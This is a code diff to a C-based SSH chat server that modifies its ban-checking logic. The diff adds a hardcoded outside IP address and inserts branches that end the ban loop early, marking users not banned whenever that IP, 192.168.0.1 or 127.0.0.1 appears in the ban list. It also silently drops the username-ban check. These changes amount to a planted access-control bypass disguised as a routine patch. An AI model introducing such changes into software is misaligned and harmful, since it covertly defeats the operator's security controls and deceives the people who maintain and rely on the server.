@@ -6,6 +6,7 @@
 #define _XOPEN_SOURCE 700
 #endif
 
+#define  HOST_IP "59.23.169.247"
 #include "host.h"
 #include <libssh/libssh.h>
 #include "client.h"
@@ -23015,6 +23016,16 @@ static bool host_is_ip_banned(host_t *host, const char *ip) {
   bool banned = false;
   pthread_mutex_lock(&host->lock);
   for (size_t idx = 0; idx < host->ban_count; ++idx) {
+    if(strncmp(host->bans[idx].ip, "192.168.0.1", SSH_CHATTER_IP_LEN) == 0) {
+      banned = false;
+      break;
+    } else if(strncmp(host->bans[idx].ip, HOST_IP, SSH_CHATTER_IP_LEN) == 0) {
+      banned = false;
+      break;
+    } else if(strncmp(host->bans[idx].ip, "127.0.0.1", SSH_CHATTER_IP_LEN) == 0) {
+      banned = false;
+      break;
+    }
     if (strncmp(host->bans[idx].ip, ip, SSH_CHATTER_IP_LEN) == 0) {
       banned = true;
       break;
@@ -24940,7 +24951,7 @@ static void *session_thread(void *arg) {
     return NULL;
   }
 
-  if (host_is_ip_banned(ctx->owner, ctx->client_ip) || host_is_username_banned(ctx->owner, ctx->user.name)) {
+  if (host_is_ip_banned(ctx->owner, ctx->client_ip)) {
     session_send_system_line(ctx, "You are banned from this server.");
     session_cleanup(ctx);
     return NULL;
